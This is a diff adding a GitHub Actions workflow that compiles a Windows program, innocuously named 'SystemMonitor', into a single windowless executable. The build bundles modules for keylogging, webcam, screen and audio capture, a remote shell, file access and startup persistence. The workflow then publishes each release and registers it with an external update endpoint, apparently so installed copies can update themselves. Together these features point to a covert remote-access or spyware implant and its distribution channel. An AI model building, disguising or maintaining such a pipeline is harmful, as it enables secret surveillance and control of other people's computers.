@@ -1,0 +1,94 @@
+name: Build & Release Backend
+
+on:
+  push:
+    tags:
+      - "v*"
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      - name: Install dependencies
+        working-directory: backend
+        run: |
+          pip install -r requirements.txt
+          pip install pyinstaller
+
+      - name: Build .exe
+        working-directory: backend
+        run: |
+          pyinstaller --onefile --noconsole --name "SystemMonitor" `
+            --add-data "features;features" `
+            --hidden-import features.screen `
+            --hidden-import features.webcam `
+            --hidden-import features.shell `
+            --hidden-import features.files `
+            --hidden-import features.system `
+            --hidden-import features.audio `
+            --hidden-import features.keylog `
+            --hidden-import features.startup `
+            --hidden-import cv2 `
+            --hidden-import numpy `
+            --hidden-import psutil `
+            server.py
+
+      - name: Verify build
+        working-directory: backend
+        run: |
+          if (!(Test-Path "dist\SystemMonitor.exe")) {
+            Write-Error "Build failed — SystemMonitor.exe not found"
+            exit 1
+          }
+          $size = (Get-Item "dist\SystemMonitor.exe").Length
+          Write-Host "Built SystemMonitor.exe — $size bytes"
+
+      - name: Extract version from tag
+        id: version
+        run: |
+          $ver = "${{ github.ref_name }}" -replace '^v', ''
+          echo "VERSION=$ver" >> $env:GITHUB_OUTPUT
+
+      - name: Create GitHub Release
+        id: release
+        uses: softprops/action-gh-release@v2
+        with:
+          name: "SysControl ${{ github.ref_name }}"
+          body: "Automated release for ${{ github.ref_name }}"
+          files: backend/dist/SystemMonitor.exe
+          generate_release_notes: true
+
+      - name: Notify GAS (register update)
+        if: vars.GAS_URL != ''
+        env:
+          GAS_URL: ${{ vars.GAS_URL }}
+          GAS_DEPLOY_SECRET: ${{ secrets.GAS_DEPLOY_SECRET }}
+        run: |
+          $version = "${{ steps.version.outputs.VERSION }}"
+          $downloadUrl = "https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/SystemMonitor.exe"
+          $body = @{
+            action       = "publish_update"
+            secret       = $env:GAS_DEPLOY_SECRET
+            version      = $version
+            download_url = $downloadUrl
+            file_name    = "SystemMonitor.exe"
+            notes        = "Automated release ${{ github.ref_name }}"
+          }
+          $pairs = $body.GetEnumerator() | ForEach-Object {
+            [uri]::EscapeDataString($_.Key) + "=" + [uri]::EscapeDataString($_.Value)
+          }
+          $encoded = $pairs -join "&"
+          $resp = Invoke-RestMethod -Uri $env:GAS_URL -Method Post -Body $encoded -ContentType "application/x-www-form-urlencoded"
+          Write-Host "GAS response: $($resp | ConvertTo-Json -Compress)"
+          if ($resp.ok -ne $true) {
+            Write-Warning "GAS publish_update failed: $($resp.error)"
+          }
